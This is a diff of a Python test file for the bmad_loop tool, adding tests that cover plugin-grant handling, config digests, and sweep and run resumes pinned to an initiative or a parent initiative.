             sweep_factory=lambda _trigger, *, started: None,
             make_adapters=unwinding.make_adapters,
@@ -1488,7 +2148,7 @@ def test_compose_sweep_unwinds_when_the_started_latch_raises(tmp_path):
     published: dict[str, bool] = {}
 
     def make_adapters(project, run_dir, policy, *, profiles=None):
-        return {"dev": object(), "review": object(), "triage": object()}
+        return {"dev": object(), "review": object(), "triage": object(), "retro": object()}
 
     def boom() -> None:
         published["run_dir"] = runs.run_dir_for(tmp_path, RUN_ID).is_dir()
@@ -1612,8 +2272,8 @@ def test_a_failed_unwind_still_reports_when_the_run_dir_is_already_gone(
     dir and THEN raises (`_discard_state_dir` is the real site — it runs after the
     `rmtree`).
 
-    `Journal.append` opens with "a" and does not mkdir, so appending here raises
-    `FileNotFoundError`. Unsuppressed that would propagate out of the unwind and
+    `Journal.append` opens the run dir confined, without a mkdir, so appending here
+    raises OSError. Unsuppressed that would propagate out of the unwind and
     replace the launch error — the one outcome this whole arm forbids — so the
     suppression around the journal write is load-bearing and gets its own test.
     The stderr report must still land, since it is now the only channel left."""
@@ -1637,3 +2297,462 @@ def test_a_failed_unwind_still_reports_when_the_run_dir_is_already_gone(
     assert "warning: could not remove the partially composed run" in warning
     assert "state dir removal failed" in warning
     assert not runs.run_dir_for(unwinding.project, RUN_ID).exists()
+
+
+# --- #496/#497: the launch's frozen plugin grants ----------------------------------
+
+
+def test_config_digest_is_unchanged_by_plugin_grants(pinned):
+    """Grants live out of the tree and are never part of the #461 payload: every pin
+    stamped before grants existed must stay byte-identical, and recording a grant
+    must not move a digest (a resume would otherwise report a host-exec change)."""
+    from bmad_loop.plugins import store
+    from bmad_loop.plugins.digest import read_tree
+    from bmad_loop.plugins.grants import GrantRecord
+
+    before = _digest(pinned)
+    plug = pinned / ".bmad-loop" / "plugins" / "rogue"
+    plug.mkdir(parents=True)
+    (plug / "plugin.toml").write_text(
+        '[plugin]\nname = "rogue"\napi_version = 1\n[hooks.pre_run]\ncmd = "true"\n',
+        encoding="utf-8",
+    )
+    record = GrantRecord.from_tree(
+        "rogue", ".bmad-loop/plugins/rogue", read_tree(plug), "2026-10-10T00:00:00Z"
+    )
+    store.save_grants(pinned, [record], expected=None)
+
+    assert _digest(pinned) == before == _pre_session_id_flag_digest(pinned)
+
+
+def _compose(composer: str, tmp_path: Path, monkeypatch, **extra):
+    common = dict(
+        project=tmp_path,
+        paths=_fake_paths(tmp_path),
+        policy=policy_mod.loads(""),
+        make_adapters=_accepting_adapters,
+        **extra,
+    )
+    if composer == "run":
+        return runsetup.compose_run(
+            run_id=RUN_ID,
+            epic_filter=None,
+            story_filter=None,
+            max_stories=None,
+            source="sprint-status",
+            spec_folder="",
+            sweep_factory=lambda _trigger, *, started: None,
+            engine_cls=_CapturingEngine,
+            stories_engine_cls=_CapturingEngine,
+            trusted_config_digest="deadbeef",
+            **common,
+        )
+    if composer == "sweep":
+        return runsetup.compose_sweep(
+            run_id=RUN_ID,
+            prompting=False,
+            decisions_only=False,
+            max_bundles=None,
+            repeat=None,
+            max_cycles=None,
+            trigger="auto",
+            sweep_engine_cls=_CapturingEngine,
+            trusted_config_digest="deadbeef",
+            **common,
+        )
+    run_dir = tmp_path / runs.RUNS_DIR / RUN_ID
+    run_dir.mkdir(parents=True)
+    monkeypatch.setattr(runs, "kill_session", lambda _run_id: None)
+    return runsetup.compose_resume(
+        run_dir=run_dir,
+        state=RunState(run_id=RUN_ID, project=str(tmp_path), started_at="now"),
+        journal=Journal(run_dir),
+        sweep_factory=lambda _trigger, *, started: None,
+        engine_cls=_CapturingEngine,
+        stories_engine_cls=_CapturingEngine,
+        sweep_engine_cls=_CapturingEngine,
+        **common,
+    )
+
+
+@pytest.mark.parametrize("composer", ["run", "sweep", "resume"])
+def test_compose_hands_the_launch_plugin_grants_to_the_engine(tmp_path, monkeypatch, composer):
+    """Each composer passes the caller's frozen grant set to the engine — the very
+    object, never a copy or a fresh read.
+
+    ABLATION: drop `plugin_grants=` from any composer's engine kwargs and its
+    parametrization fails."""
+    from bmad_loop.plugins import GrantSet
+
+    grants = GrantSet(snapshot_root=tmp_path / "snapshots")
+    composed = _compose(composer, tmp_path, monkeypatch, plugin_grants=grants)
+    assert composed.engine.kwargs["plugin_grants"] is grants
+
+
+@pytest.mark.parametrize("composer", ["run", "sweep", "resume"])
+def test_compose_defaults_to_no_grants_and_never_reads_the_store(tmp_path, monkeypatch, composer):
+    """A layer below a launch site never turns "no grants" into "read the store":
+    an omitted grant set is the empty one (fail closed)."""
+    from bmad_loop.plugins import store
+
+    monkeypatch.setattr(store, "load_grants", lambda _p: pytest.fail("store read"))
+    composed = _compose(composer, tmp_path, monkeypatch)
+    grants = composed.engine.kwargs["plugin_grants"]
+    assert grants.records == () and grants.fault is None and grants.snapshot_root is None
+
+
+# ------------------------------------------------- v7: the sweep's initiative pin
+
+
+def test_sweep_resume_refuses_initiative_change(project_v7, monkeypatch):
+    """A v7 sweep pins the initiative whose ledger it works. Resumed after the
+    operator switched `[core] active_initiative`, it would apply its triage and
+    bundles to another ledger whose DW ids name other entries, so the resume is
+    refused with the fix (switch back, or start a new sweep) before it touches
+    any session. The unchanged initiative resumes.
+
+    ABLATION (performed): drop the `sweep_initiative_conflict` raise in
+    `compose_resume` and the switched resume composes an engine (and kills the
+    run's session first)."""
+    from conftest import V7_USER_CONFIG_REL
+
+    project = project_v7.project
+    paths = bmadconfig.load_paths(project)
+    composed = runsetup.compose_sweep(
+        project=project,
+        paths=paths,
+        policy=policy_mod.loads(""),
+        run_id=RUN_ID,
+        prompting=False,
+        decisions_only=False,
+        max_bundles=None,
+        repeat=None,
+        max_cycles=None,
+        trigger="cli",
+        make_adapters=_accepting_adapters,
+        sweep_engine_cls=_CapturingEngine,
+        trusted_config_digest="deadbeef",
+    )
+    state = load_state(composed.run_dir)
+    assert state.initiative == project_v7.initiative
+    assert state.initiative_folder == str(paths.initiative_folder)
+    assert state.store_topology["layout"] == "T1"
+    assert runsetup.sweep_initiative_conflict(state, paths) is None
+
+    (project_v7.output_folder / "other").mkdir()
+    (project / V7_USER_CONFIG_REL).write_text(
+        '[core]\nactive_initiative = "other"\n', encoding="utf-8"
+    )
+    switched = bmadconfig.load_paths(project)
+    killed: list[str] = []
+    monkeypatch.setattr(runs, "kill_session", killed.append)
+
+    def resume(live_paths):
+        return runsetup.compose_resume(
+            project=project,
+            paths=live_paths,
+            run_dir=composed.run_dir,
+            state=state,
+            policy=policy_mod.loads(""),
+            journal=Journal(composed.run_dir),
+            sweep_factory=lambda _trigger, *, started: None,
+            make_adapters=_accepting_adapters,
+            engine_cls=_CapturingEngine,
+            stories_engine_cls=_CapturingEngine,
+            sweep_engine_cls=_CapturingEngine,
+        )
+
+    with pytest.raises(runsetup.SweepPinError) as refused:
+        resume(switched)
+    message = str(refused.value)
+    assert f"started on initiative {project_v7.initiative!r}" in message
+    assert "now 'other'" in message
+    assert f"set `[core] active_initiative` back to {project_v7.initiative!r}" in message
+    assert "start a new sweep" in message
+    assert killed == []
+
+    assert resume(paths).engine.kwargs["state"] is state
+
+
+def test_sweep_initiative_conflict_ignores_story_runs_and_v6():
+    """Only a sweep is judged here (a tickets run checks its pin on every tree
+    read), and a v6 sweep pins nothing."""
+    v6 = _fake_paths(Path("/p"))
+    sweep = RunState(run_id=RUN_ID, project="/p", started_at="now", run_type="sweep")
+    assert runsetup.sweep_initiative_conflict(sweep, v6) is None
+    story = RunState(run_id=RUN_ID, project="/p", started_at="now", initiative="a")
+    assert runsetup.sweep_initiative_conflict(story, v6) is None
+    pinned = dataclasses.replace(sweep, initiative="a")
+    assert "unset `[core] active_initiative`" not in (
+        runsetup.sweep_initiative_conflict(pinned, v6) or ""
+    )
+    assert "now unset" in (runsetup.sweep_initiative_conflict(pinned, v6) or "")
+
+
+# ------------------------- v7: a chained child's run-end sweep (pinned to the parent)
+
+CHILD = "initiative-child"
+
+
+def _chained_child_paths(project_v7):
+    """A v7 parent initiative with a committed child folder beside it, and the
+    paths a chained child run holds: the loaded (parent's) paths re-rooted on the
+    child, as `runs.paths_for_state` re-roots them."""
+    from conftest import git
+
+    root = project_v7.project
+    child_folder = project_v7.initiative_folder.parent / CHILD
+    shutil.copytree(project_v7.initiative_folder, child_folder)
+    git(root, "add", "-A")
+    git(root, "commit", "-q", "-m", "a child initiative")
+    return bmadconfig.load_paths(root).with_initiative(CHILD), child_folder
+
+
+def _compose_chained_sweep(project_v7):
+    child_paths, child_folder = _chained_child_paths(project_v7)
+    composed = runsetup.compose_sweep(
+        project=project_v7.project,
+        paths=child_paths,
+        policy=policy_mod.loads(""),
+        run_id=RUN_ID,
+        prompting=False,
+        decisions_only=False,
+        max_bundles=None,
+        repeat=None,
+        max_cycles=None,
+        trigger="epic-boundary",
+        make_adapters=_accepting_adapters,
+        sweep_engine_cls=_CapturingEngine,
+        trusted_config_digest="deadbeef",
+        parent_initiative=project_v7.initiative,
+    )
+    return composed, child_folder
+
+
+def test_compose_sweep_pins_a_chained_childs_parent_and_works_the_childs_ledger(project_v7):
+    """A chained child's run-end sweep records the parent it is pinned to, keeps
+    the child as its initiative and folder, and its engine works the CHILD's
+    ledger, never the parent's.
+
+    ABLATION (performed): drop `parent_initiative=` from compose_sweep's RunState
+    and this FAILS."""
+    composed, child_folder = _compose_chained_sweep(project_v7)
+    state = load_state(composed.run_dir)
+    assert state.parent_initiative == project_v7.initiative
+    assert state.initiative == CHILD
+    assert state.initiative_folder == str(child_folder)
+    assert composed.state.parent_initiative == project_v7.initiative
+    ledger = composed.engine.kwargs["paths"].deferred_work
+    assert ledger == child_folder / "deferred-work.md"
+    assert ledger != project_v7.initiative_folder / "deferred-work.md"
+
+
+def test_compose_sweep_records_no_parent_off_v7(tmp_path):
+    """Off v7 there is no initiative to chain through: the parent is never recorded."""
+    composed = runsetup.compose_sweep(
+        project=tmp_path,
+        paths=_fake_paths(tmp_path),
+        policy=policy_mod.loads(""),
+        run_id=RUN_ID,
+        prompting=False,
+        decisions_only=False,
+        max_bundles=None,
+        repeat=None,
+        max_cycles=None,
+        trigger="cli",
+        make_adapters=_accepting_adapters,
+        sweep_engine_cls=_CapturingEngine,
+        trusted_config_digest="deadbeef",
+        parent_initiative="initiative-parent",
+    )
+    assert load_state(composed.run_dir).parent_initiative is None
+
+
+def _parent_breakdown(project_v7):
+    return project_v7.initiative_folder / "tickets" / "tickets.toml"
+
+
+def _list_children(project_v7, *slugs):
+    """Make the template's initiative a parent listing ``slugs`` as its
+    `[[initiative]]` children, as compose_run's membership check reads it."""
+    rows = "".join(
+        f'\n[[initiative]]\nid = {i}\nslug = "{slug}"\ntitle = "{slug}"\n'
+        for i, slug in enumerate(slugs, 1)
+    )
+    breakdown = _parent_breakdown(project_v7)
+    breakdown.write_text(breakdown.read_text(encoding="utf-8") + rows, encoding="utf-8")
+
+
+def _compose_chained_run(project_v7, paths, parent):
+    return runsetup.compose_run(
+        project=project_v7.project,
+        paths=paths,
+        policy=policy_mod.loads(""),
+        run_id=RUN_ID,
+        epic_filter=None,
+        story_filter=None,
+        max_stories=None,
+        source=worksource.SOURCE_TICKETS,
+        spec_folder="",
+        sweep_factory=lambda _trigger, *, started: None,
+        make_adapters=_accepting_adapters,
+        engine_cls=_CapturingEngine,
+        stories_engine_cls=_CapturingEngine,
+        tickets_engine_cls=_CapturingEngine,
+        trusted_config_digest="deadbeef",
+        parent_initiative=parent,
+    )
+
+
+def test_compose_run_records_a_chained_childs_parent_on_the_childs_paths(project_v7):
+    """A chained child run records its parent and pins the CHILD as its initiative
+    and folder, the shape `runs.paths_for_state` re-roots on at resume.
+
+    ABLATION (performed): drop `parent_initiative=` from compose_run's
+    `build_run_state` call and this FAILS."""
+    child_paths, child_folder = _chained_child_paths(project_v7)
+    _list_children(project_v7, CHILD)
+    composed = _compose_chained_run(project_v7, child_paths, project_v7.initiative)
+    state = load_state(composed.run_dir)
+    assert state.parent_initiative == project_v7.initiative
+    assert state.initiative == CHILD
+    assert state.initiative_folder == str(child_folder)
+    assert composed.engine.kwargs["state"].parent_initiative == project_v7.initiative
+    assert composed.engine.kwargs["paths"] is child_paths
+
+
+@pytest.mark.parametrize("rooted", ["parent", "off-v7"])
+def test_compose_run_refuses_a_parent_without_child_rooted_paths(project_v7, rooted):
+    """A parent handed with paths that are not rooted on one of its children — the
+    parent's own, or a project off v7 — raises before a run dir is published."""
+    if rooted == "parent":
+        paths = bmadconfig.load_paths(project_v7.project)
+    else:
+        paths = _fake_paths(project_v7.project)
+    with pytest.raises(ValueError, match="needs paths rooted on one of its child initiatives"):
+        _compose_chained_run(project_v7, paths, project_v7.initiative)
+    runs_dir = project_v7.project / runs.RUNS_DIR
+    assert not runs_dir.exists() or not any(runs_dir.iterdir())
+
+
+@pytest.mark.parametrize("parent", ["unlisted", "no-children-table", "unreadable"])
+def test_compose_run_refuses_a_child_its_parent_does_not_list(project_v7, parent):
+    """Child-rooted paths are not enough: the child must be one the parent's
+    `[[initiative]]` table lists. A parent listing other children, one with no
+    such table, or one whose table cannot be read raises before a run dir is
+    published, naming the parent and the child.
+
+    ABLATION (performed): drop the membership check from `_chained_child_refusal`
+    and this FAILS."""
+    child_paths, _ = _chained_child_paths(project_v7)
+    if parent == "unlisted":
+        _list_children(project_v7, "initiative-other")
+    elif parent == "unreadable":
+        _parent_breakdown(project_v7).write_text("[[initiative]\n", encoding="utf-8")
+    with pytest.raises(ValueError) as refused:
+        _compose_chained_run(project_v7, child_paths, project_v7.initiative)
+    message = str(refused.value)
+    assert repr(project_v7.initiative) in message and repr(CHILD) in message
+    expected = {
+        "unlisted": "lists initiative-other",
+        "no-children-table": "lists no `[[initiative]]` children",
+        "unreadable": "TOMLDecodeError",
+    }[parent]
+    assert expected in message
+    runs_dir = project_v7.project / runs.RUNS_DIR
+    assert not runs_dir.exists() or not any(runs_dir.iterdir())
+
+
+@pytest.mark.parametrize("live", ["parent", "other", "child", "unset"])
+def test_chained_sweep_resume_is_pinned_to_the_parent(project_v7, monkeypatch, live):
+    """A chained child's sweep resumes only while the live config names its
+    parent: the resume judges the loaded paths (`_prepare_resume_locked`), then
+    `compose_resume` the re-rooted ones. A config naming another initiative, the
+    child itself, or none is refused with the parent to restore, before any
+    session is killed.
+
+    ABLATION (performed): make the conflict compare only `state.initiative`
+    against the live value and the parent row is refused while the child row
+    composes."""
+    from conftest import V7_USER_CONFIG_REL
+
+    project = project_v7.project
+    parent = project_v7.initiative
+    composed, _child_folder = _compose_chained_sweep(project_v7)
+    state = load_state(composed.run_dir)
+    (project_v7.output_folder / "other").mkdir()
+    value = {"parent": parent, "other": "other", "child": CHILD, "unset": None}[live]
+    (project / V7_USER_CONFIG_REL).write_text(
+        "[core]\n" + (f'active_initiative = "{value}"\n' if value else ""), encoding="utf-8"
+    )
+    killed: list[str] = []
+    monkeypatch.setattr(runs, "kill_session", killed.append)
+
+    loaded = bmadconfig.load_paths(project, want_tickets=runs.resolves_as_tickets(state))
+    conflict = runsetup.sweep_initiative_conflict(state, loaded)
+    if live != "parent":
+        assert conflict is not None
+        assert f"child initiative {CHILD!r} of parent initiative {parent!r}" in conflict
+        assert f"set `[core] active_initiative` back to {parent!r}" in conflict
+        assert "start a new sweep" in conflict
+        assert killed == []
+        return
+    assert conflict is None
+    run_paths = runs.paths_for_state(loaded, state)
+
+    def resume(paths):
+        return runsetup.compose_resume(
+            project=project,
+            paths=paths,
+            run_dir=composed.run_dir,
+            state=state,
+            policy=policy_mod.loads(""),
+            journal=Journal(composed.run_dir),
+            sweep_factory=lambda _trigger, *, started: None,
+            make_adapters=_accepting_adapters,
+            engine_cls=_CapturingEngine,
+            stories_engine_cls=_CapturingEngine,
+            sweep_engine_cls=_CapturingEngine,
+        )
+
+    # the backstop refuses the loaded (parent-rooted) paths handed in un-re-rooted
+    with pytest.raises(runsetup.SweepPinError, match=f"rooted on initiative {parent!r}"):
+        resume(loaded)
+    assert killed == []
+    engine = resume(run_paths).engine
+    assert engine.kwargs["paths"].deferred_work == run_paths.initiative_folder / "deferred-work.md"
+    assert run_paths.initiative_folder.name == CHILD
+
+
+def test_sweep_initiative_conflict_judges_a_chained_sweep_by_which_paths_it_gets(project_v7):
+    """Loaded paths pass only while they name the parent; re-rooted paths only
+    while they are rooted on the child. Loaded paths of a config naming the child
+    look re-rooted, so the kind is the caller's to name, never inferred. An
+    unchained sweep is judged the same either way."""
+    loaded = bmadconfig.load_paths(project_v7.project)
+    parent = project_v7.initiative
+    rerooted = loaded.with_initiative(CHILD)
+    sweep = RunState(
+        run_id=RUN_ID,
+        project=str(project_v7.project),
+        started_at="now",
+        run_type="sweep",
+        initiative=CHILD,
+        parent_initiative=parent,
+    )
+    judge = runsetup.sweep_initiative_conflict
+    assert judge(sweep, loaded) is None
+    assert judge(sweep, rerooted, rerooted=True) is None
+    # the re-rooted (child's) paths judged as loaded: the live value is not the parent
+    assert "the active initiative is now 'initiative-child'" in (judge(sweep, rerooted) or "")
+    # the loaded (parent's) paths judged as re-rooted: not rooted on the child
+    assert f"rooted on initiative {parent!r}" in (judge(sweep, loaded, rerooted=True) or "")
+    misfiled = dataclasses.replace(rerooted, initiative_folder=loaded.initiative_folder)
+    assert judge(sweep, misfiled, rerooted=True) is not None
+    v6 = _fake_paths(project_v7.project)
+    for kind in (False, True):
+        assert f"back to {parent!r}" in (judge(sweep, v6, rerooted=kind) or "")
+    unchained = dataclasses.replace(sweep, initiative=parent, parent_initiative=None)
+    for kind in (False, True):
+        assert judge(unchained, loaded, rerooted=kind) is None
+        assert judge(unchained, rerooted, rerooted=kind) == judge(unchained, rerooted)
